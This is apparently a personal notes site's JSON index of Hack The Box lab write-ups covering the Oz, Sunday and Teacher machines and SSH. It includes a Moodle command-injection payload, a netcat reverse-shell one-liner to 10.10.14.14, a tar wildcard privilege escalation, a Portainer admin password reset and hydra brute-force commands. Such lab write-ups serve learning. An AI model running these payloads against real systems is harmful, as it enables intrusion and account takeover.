\u0026quot;com.docker.network.bridge.enable_ip_masquerade\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;com.docker.network.bridge.host_binding_ipv4\u0026quot;: \u0026quot;0.0.0.0\u0026quot;, \u0026quot;com.docker.network.bridge.name\u0026quot;: \u0026quot;docker0\u0026quot;, \u0026quot;com.docker.network.driver.mtu\u0026quot;: \u0026quot;1500\u0026quot; }, \u0026quot;Labels\u0026quot;: {}  NMAP nmap -sT -T5 172.17.02 Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-21 09:13 CST Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 100.00% done; ETC: 09:13 (0:00:00 remaining) Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Nmap scan report for 172.17.02 (172.17.0.2) Host is up (0.00017s latency). Not shown: 999 closed ports PORT STATE SERVICE 9000/tcp open cslistener  Proxychain Nmap using ~C capitcal c trick then use proxychain make sure to turn off dns and turn on quite-mode\nproxychains nmap -sT 172.17.0.2 -Pn --open -T4 ProxyChains-3.1 (http://proxychains.sf.net) Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 17:52 EST Nmap scan report for 172.17.0.2 Host is up (0.044s latency). Not shown: 999 closed ports PORT STATE SERVICE 9000/tcp open cslistener  NetCat\nusing a bash for loop, it will go through the sequence. this can become cluttered\nfor ip in $(seq 1 65000);do nc -zv -w 1 172.17.0.2 $ip 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed \u0026amp; done for ip in $(seq 9000 9010);do nc -zv -w 1 172.17.0.2 $ip 2\u0026gt;\u0026amp;1 |grep 'succeeded!' \u0026amp; done  I dont like the for loop because it just craps out so much output. for some reason it always makes a mess. I think i modified the former from the netcat ip range scanner. The below option is much cleaner.\nnc -zv -w 1 172.17.0.2 8900-10000 2\u0026gt;\u0026amp;1 | grep succeeded!  Exploiting Portainer changing the password on portainer.io submit a POST request to the web directory/api/users/admin/init. I\u0026rsquo;m not sure why submiting to init resets the admin password. i guess that\u0026rsquo;s the api used to reset the password. Again i dont know. Finish the request like in the pciture below. This will reset the admin password to whatever password you submit.\nLogin with the submitted password\nPortainer.io\ni think this is pretty cool i love messing with these web interfaces.\nsome problems may occur the ssh tunnel may drop youll have to reset it by using the port knocking for loop. Be sure to turn off burp the proxy really slows it down it will not load.\nc\nit could take awhile to create the container or hang depends.\nchange from /bin/bash to /bin/sh. there is a cron job running resetting the containers to default.\nssh\u0026gt; -L9051:172.17.0.2:9050\nanother method is using the -L switch when logging in, you may also use sshutle.\nssh -i dorthi.ssh dorthi@oz.htb -L 9051:172.17.0.2:9000\npython:2.7-alpine\ni could not get shuttle to work for some reason\nsshuttle.\nsshuttle -r dorthi@oz.htb 172.0.0.0/16 \u0026ndash;ssh-cmd \u0026lsquo;ssh -i dorthi.ssh\u0026rsquo;\n"
},
{
	"uri": "/linux/ssh/",
	"title": "ssh",
	"tags": [],
	"description": "",
	"content": "SSH - secure shell Is a commonly used port/service. In fact, it is almost on every Linux Box on hackthebox. Network administrators use it to remotely managing Network Peripherals. There are a couple CVE\u0026rsquo;s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.\nSSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.\nStart Service\nDirectories private keys might be in\n/etc/ssh /root/.ssh  To Enable ssh root login find the sshd_conf fiel and append or edit permitrootlogin to yes\nvi /etc/ssh/sshd_conf PermitRootLogin yes service ssh start\u0026lt;/c  i thought this was note worthy from flujab. flujab has host.deny enabled to all host are blocked and only whitelisted hosts are allowed to connect. host.deny host.allow\nhosts.deny\n​ This was not accessible from\n# /etc/hosts.deny: list of hosts that are _not_ allowed to access the system. # See the manual pages hosts_access(5) and hosts_options(5). # # Example: ALL: some.host.name, .some.domain # ALL EXCEPT in.fingerd: other.host.name, .other.domain # # If you're going to protect the portmapper use the name \u0026quot;rpcbind\u0026quot; for the # daemon name. See rpcbind(8) and rpc.mountd(8) for further information. # # The PARANOID wildcard matches any host whose name does not match its # address. # # You may wish to enable this to ensure any programs that don't # validate looked up hostnames still leave understandable logs. In past # versions of Debian this has been the default. # ALL: PARANOID sshd : ALL  HOSTS.ALLOW\n​ just add sshd: address , \u0026amp; all: address\n# grant ssh access per host # syntax: # sshd : [host ip] ###########################  sshd : change_me_to_address ALL : change_me_to_address  SSH IPV6\nEXAMPLE\nssh -6 thrasivoulous@dead:beef::0250:56ff:fe8f:0b58 -i thrasivoulos.pub  ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J destination] [-L address] [-l login_name] [-m mac_spec] -6 Forces ssh to use IPv6 addresses only. IPv6 addresses can be specified by enclosing the address in square brackets. Only the superuser can forward privileged ports. By default, the local port is bound in accordance with the GatewayPorts setting. However, an explicit bind_address Port forwardings can also be specified in the configuration file. Only the superuser can forward privileged ports. IPv6 addresses can be specified by enclosing the address in square brackets. Port forwardings can also be specified in the configuration file. Privileged ports can be forwarded only when logging in as root on the remote machine. IPv6 addresses can be specified by enclosing the address in square brackets.  "
},
{
	"uri": "/hackthebox/boxes/sunday/",
	"title": "sunday",
	"tags": [],
	"description": "",
	"content": " INCOMPLETE\nsunos 5.111 2008, SunSsh\nFINGER USER LIST finger user@10.10.10.76 -s displays the user login real terminal write status no access is a least priviliege user -l same as -s but with directory information -p limits -l output  stuff\nthis box requires equine wordlist you can’t use the standard one. Metasploit module, be sure to change the dictionary used to enumerate the user list.\nSammy Sunny\nHASHCAT\nI don’t remember where I found the hashes, i digress. this is really going to turn into a hashcat guide bauhahahahaha\nIdentifying the type of hash was a major pain. https://hashcat.net/wiki/doku.php?id=example_hashes\nssh uses diffie hellman group sha1 for the key exchange. legacy\nssh -oKexAlgorithms=+diffie-hellman-group1-sha1 @10.10.10.79 -p 22022 -P sunday  passwords sunny\nRoot\nto get a root shell you could copy over /etc/shadow.\n"
},
{
	"uri": "/hackthebox/boxes/teacher/",
	"title": "teacher",
	"tags": [],
	"description": "",
	"content": " nmap -sT -T3 -PS80,443,8000,8443,8800 -p 80,443,8000,8443,8080 -oA http-enum-results \u0026ndash;script=http-enum teacher.htb\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 16:27 EST Nmap scan report for teacher.htb (10.10.10.153) Host is up (0.043s latency).\nPORT STATE SERVICE 80/tcp open http | http-enum: | /css/: Potentially interesting directory w/ listing on \u0026lsquo;apache/2.4.25 (debian)\u0026rsquo; | /images/: Potentially interesting directory w/ listing on \u0026lsquo;apache/2.4.25 (debian)\u0026rsquo; | /js/: Potentially interesting directory w/ listing on \u0026lsquo;apache/2.4.25 (debian)\u0026rsquo; |_ /manual/: Potentially interesting folder\nGobuster /index.html (Status: 200) /images (Status: 301) /gallery.html (Status: 200) /css (Status: 301) /manual (Status: 301) == no /js (Status: 301) /javascript (Status: 301) /fonts (Status: 301) /phpmyadmin (Status: 403) === forbidden\n/moodle (Status: 301) /server-status (Status: 403)\nMoodle /search (Status: 301)\n/media (Status: 301) /login (Status: 301) /user (Status: 301)\nprofile // templates (Status: 301)/tests (Status: 301)/classes (Status: 301)/filters (Status: 301)/amd (Status: 301)/selector (Status: 301)\n/calendar (Status: 301) /blog (Status: 301)\n/files (Status: 301) == neat\n​ tests // classes // converter // converter has some interesting firectories\nMaarten Balliauw\n/rss (Status: 301) /admin (Status: 301) /comment (Status: 301) /report (Status: 301) /local (Status: 301) /pix (Status: 301) /tag (Status: 301) /group (Status: 301) /version.php (Status: 200) /my (Status: 301) === neat /lib (Status: 301) /install (Status: 301) /install.php (Status: 302) /portfolio (Status: 301) /cache (Status: 301) /lang (Status: 301) /theme (Status: 301) /notes (Status: 301) /message (Status: 301)\n​ /templates (Status: 301) ​ /tests (Status: 301) ​ /upgrade.txt (Status: 200) ​ /classes (Status: 301) ​ /amd (Status: 301) ​ /output (Status: 301)\n​ /blocks (Status: 301) /question (Status: 301) /backup (Status: 301) === ooooo\n/rating (Status: 301) /filter (Status: 301)\n/mod (Status: 301)\n/forum (Status: 301) /feedback (Status: 301) /data (Status: 301) /page (Status: 301) /wiki (Status: 301) /glossary (Status: 301) /chat (Status: 301) /book (Status: 301) /folder (Status: 301) /survey (Status: 301) /resource (Status: 301) /url (Status: 301) /quiz (Status: 301) /workshop (Status: 301) /label (Status: 301) /choice (Status: 301) /assignment (Status: 301) /lesson (Status: 301) /assign (Status: 301)  /auth (Status: 301) ==== hmmmm\n​ /email (Status: 301) ​ /tests (Status: 301)\n​ behat // user teacher1 wrongpass admin\n​ /manual (Status: 301) ==== nop\nusername teacher1 Giovanni Chhatta  ​ /db (Status: 301)==== nope ​ /classes (Status: 301) ​ /none (Status: 301) ​ /cas (Status: 301) ​ /ldap (Status: 301) ​ /webservice (Status: 301) ​ /yui (Status: 301)\n/course (Status: 301) /error (Status: 301) /badges (Status: 301) /repository (Status: 301) = neat /analytics (Status: 301) /availability (Status: 301) /webservice (Status: 301) /plagiarism (Status: 301) /competency (Status: 301)\nPASSWORD script\nimport string for c in string.printable: print 'Th4C00lTheacha'+ c  Th4C00lTheacha#\nwfuzz -c -w /opt/htb/wordlist/seclist/Fuzzing/special-chars.txt-d \u0026quot;anchor=\u0026amp;username=giovanni\u0026amp;password=Th4C00lTheachaFUZZ\u0026quot; -u http://teacher.htb/moodle/login/index.php hydra teacher.htb -l giovanni -P http-form-post \u0026quot;/moodle/login/index.php:anchor=\u0026amp;username=^\u0026amp;password=Th4C00lTheacha^PAASS^:Invalid login, please try again\u0026quot; hydra teacher.htb -l giovanni -P list_of_pass http-form-post \u0026quot;/moodle/login/index.php:anchor=\u0026amp;username=^USER^\u0026amp;password=^PASS^:Invalid login, please try again\u0026quot; https://security.stackexchange.com/questions/89443/how-to-get-cookies-from-aspx-site-to-use-it-with-hydra  so verbose helped allot i saw it was getting redirected to the default login but then i had the diea that maybe its not seeing the Invalid login. So i changed the invalid parameter to Teacher.\nhydra teacher.htb -l giovanni -P list_of_pass http-form -post \u0026quot;/moodle/login/index.php:anchor=\u0026amp;username=^USER^\u0026amp;password=^PASS^:Teacher\u0026quot; -t 3 -w 5 -f -v -t time to wait -w time to wait for response -f stop when a password is found optional -v verbose F= invalid this F=Teacher by default  passwordset tar\nModule options (exploit/multi/http/moodle_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD Th4C00lTheacha# yes Password to authenticate with Proxies no A proxy chain of format type:host: port[,type:host:port][...] RHOST teacher.htb yes The target address RPORT 80 yes The target port (TCP) SESSKEY gc7hreuj5idcalmrhan93pj174 no The session key of the user to imp ersonate SSL false no Negotiate SSL/TLS for outgoing con nections TARGETURI /moodle/ yes The URI of the Moodle installation USERNAME giovanni yes Username to authenticate with VHOST no HTTP server virtual host  https://blog.ripstech.com/2018/moodle-remote-code-execution/\nsome how when you enter in this as a math equation it eqascpes out and gives command injection. XD\nTh4C00lTheacha#\n `$_GET[0]` illegal {a.`$_GET[0]`} /*{a*/`$_GET[0]`;//{x}} /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D10%26addonpage%3D0\u0026amp;appendqnumstring=addquestion\u0026amp;scrollpos=0\u0026amp;id=12\u0026amp;wizardnow=datasetitems\u0026amp;cmid=2\u0026amp;0=(date;whoami) rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 9058 \u0026gt;/tmp/f  tried the newest eval\nHow to identify the version of moodle as a teacher, backdup a course quix or whatever. Then unzip you may need to apppend a different extension\n3.4.1\nclick on save and display\nhttp://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=cb8aefa658cf7ad8f002a480343afb2dea94cc08\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;  stretch (security)\nchanges directories\na wild card is bad\nthe script is run with /bin/sh -c\nIf the -c option is present, then commands are read from string. If there are arguments after the string, they are assigned to the positional parameters, starting with $0\ntar wildcard exploit is possible allowing us to execute commands at whatever the script is at\n--checkpoint=1 --checkpoint-action=exec=sh shell.sh exploit in shell.sh  /bin/bash /usr/bin/backup.sh /usr/sbin/CRON -f  then it moves into the tmp directory im not sure if its /root/tmp or work/tmp. changes the permissions on everything in tm recursive to 777 chmod 777 makes it read and writeable \u0026amp; executable by all users\ncd /home/giovanni/work; tar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R;  $ find / -user root -perm -4000 -print 2\u0026gt;/dev/null /bin/ping /bin/su /bin/fusermount /bin/umount /bin/mount /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/chsh /usr/bin/chfn /usr/bin/passwd  /bin/pwd\nfinally found the password and user name to login into mysql. what a pain i the arse, first need to upgrade the shell with python pty. then login into mysql mysql -u username -p.\nMariaDB [(none)]\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | phpmyadmin | +--------------------+ 2 rows in set (0.00 sec) MariaDB [phpmyadmin]\u0026gt; show tables show tables -\u0026gt; ; ; +------------------------+ | Tables_in_phpmyadmin | +------------------------+ | pma__bookmark | | pma__central_columns | | pma__column_info | | pma__designer_settings | | pma__export_templates | | pma__favorite | | pma__history | | pma__navigationhiding | | pma__pdf_pages | | pma__recent | | pma__relation | | pma__savedsearches | | pma__table_coords | | pma__table_info | | pma__table_uiprefs | | pma__tracking | | pma__userconfig | | pma__usergroups | | pma__users | +------------------------+ show index from pma__users show index from pma__users -\u0026gt; ; ; +------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+ | Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment | +------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+ | pma__users | 0 | PRIMARY | 1 | username | A | 0 | NULL | NULL | | BTREE | | | | pma__users | 0 | PRIMARY | 2 | usergroup | A | 0 | NULL | NULL | | BTREE | | | +------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+ SHOW COLUMNS FROM pma__users SHOW COLUMNS FROM pma__users -\u0026gt; ; ; +-----------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-----------+-------------+------+-----+---------+-------+ | username | varchar(64) | NO | PRI | NULL | | | usergroup | varchar(64) | NO | PRI | NULL | | +-----------+-------------+------+-----+---------+-------+ 2 rows in set (0.00 sec) | COLUMNS | [49/1491] | COLUMN_PRIVILEGES | | ENABLED_ROLES | | ENGINES | | EVENTS | | FILES | | GLOBAL_STATUS | | GLOBAL_VARIABLES | | KEY_CACHES | | KEY_COLUMN_USAGE | | PARAMETERS | | PARTITIONS | | PLUGINS | | PROCESSLIST | | COLUMNS | [49/1491] | COLUMN_PRIVILEGES | | ENABLED_ROLES | | ENGINES | | EVENTS | | FILES | | GLOBAL_STATUS | | GLOBAL_VARIABLES | | KEY_CACHES | | KEY_COLUMN_USAGE | | PARAMETERS | | PARTITIONS | | PLUGINS |  describe is cool will show you whats in the table\ndescribe pma__central_columns\ndescribe pma__users\ndescribe pma__usergroups\n+---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | ALL_PLUGINS | | APPLICABLE_ROLES | | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | | COLUMNS | | COLUMN_PRIVILEGES | | ENABLED_ROLES | | ENGINES | | EVENTS | | FILES | | GLOBAL_STATUS | | GLOBAL_VARIABLES | | KEY_CACHES | | KEY_COLUMN_USAGE | | PARAMETERS | | PARTITIONS | | PLUGINS | | PROCESSLIST | | PROFILING | | REFERENTIAL_CONSTRAINTS | | ROUTINES | | SCHEMATA | | SCHEMA_PRIVILEGES | | SESSION_STATUS | | SESSION_VARIABLES | | STATISTICS | | SYSTEM_VARIABLES | | STATISTICS | | SYSTEM_VARIABLES | | TABLES | | TABLESPACES | | TABLE_CONSTRAINTS | | TABLE_PRIVILEGES | | TRIGGERS | | USER_PRIVILEGES | | VIEWS | | GEOMETRY_COLUMNS | | SPATIAL_REF_SYS | | CLIENT_STATISTICS | | INDEX_STATISTICS | | INNODB_SYS_DATAFILES | | TABLE_STATISTICS | | INNODB_SYS_TABLESTATS | | USER_STATISTICS | | INNODB_SYS_INDEXES | | XTRADB_RSEG | | INNODB_CMP_PER_INDEX | | INNODB_TRX | | CHANGED_PAGE_BITMAPS | | INNODB_FT_BEING_DELETED | | INNODB_LOCK_WAITS | | INNODB_LOCKS | | INNODB_TABLESPACES_ENCRYPTION | | XTRADB_INTERNAL_HASH_TABLES | | INNODB_SYS_FIELDS | | INNODB_CMPMEM_RESET | | INNODB_CMP | | INNODB_FT_INDEX_TABLE | | INNODB_SYS_TABLESPACES | | INNODB_MUTEXES | | INNODB_BUFFER_PAGE_LRU | | INNODB_SYS_FOREIGN_COLS | | INNODB_CMP_RESET | | INNODB_BUFFER_POOL_STATS | | INNODB_FT_INDEX_CACHE | | INNODB_SYS_FOREIGN | | INNODB_METRICS | | INNODB_FT_DEFAULT_STOPWORD | | INNODB_CMPMEM | | INNODB_SYS_TABLES | | INNODB_SYS_COLUMNS | | INNODB_FT_CONFIG | | INNODB_BUFFER_PAGE | | INNODB_CMP_PER_INDEX_RESET | | XTRADB_READ_VIEW | select * FROM mdl_user select * from table will spit out the content xD desc will show the over view of the table but not the content  summary\nlogin to mysql user root, use the password found in /www Welkom1! the passsword also works for phpmyadmin. using phpmyadmin doesn\u0026rsquo;t show all the databases. You have to login as root to get to the moodle database. onces inside the moodle database. Go to the mdl_user table and run select * from mdl_user, the output should be the users and password for the users. giovannibak isn\u0026rsquo;t a user for the webapp but it is a system user. after decoding giovannibak password should reveal expelled. upgrade your shell with python pty su giovannibak.\nroot\nthe script is read using -c which puts everything in a string then runs it. which might also effect wildcard exec.\ncd /home/giovanni/work;\nim not sure if courses/* is breaking tar wildcard exec\n/usr/bin/backup.sh\ntar -czvf tmp/backup_courses.tar.gz courses/*; cd tmp; tar -xf backup_courses.tar.gz; chmod 777 * -R;\nalgebra has root but isn\u0026rsquo;t suid i can write to the file in algebra but i can not add files.\ngetting root remove courses directory then symlink to the root directory. itll then tar the root directory and untar it inside tmp/courses.\ni tried editing other directories and files i change /etc permissions tried messing with shadow file. couldn\u0026rsquo;t change any of the passwords lol.\ngetting a shell as root, first the delete the tmp directory inside of giovanni/work. Then symlink it to /usr/bin changing the permission on backup.sh. allowing us to read write and execute as any user inside /usr/bin. :P. I dropped a reverse shell. this was tricky as there are only five lines of code and I was trying to think of ways to exploit the script to get a root shell. this method felt like something out Inception.\nif your shell drops itll try and reconnect every couple of minutes lol\n"
}]